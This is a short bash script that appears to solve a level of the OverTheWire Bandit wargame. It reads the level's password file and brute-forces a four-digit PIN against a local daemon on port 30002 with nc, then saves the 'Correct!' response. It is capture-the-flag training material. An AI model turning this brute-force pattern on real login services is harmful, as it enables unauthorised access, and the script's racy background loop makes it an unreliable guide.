#!/bin/bash
passwd=$(< /etc/bandit_pass/bandit24)

for a in {0..9999}
do
        echo $passwd' '$a | nc localhost 30002 >> result &
        if cat result | grep -q "Correct!"; then
            sort result | uniq -u >> bandit25passwd &
            break
        fi
    done

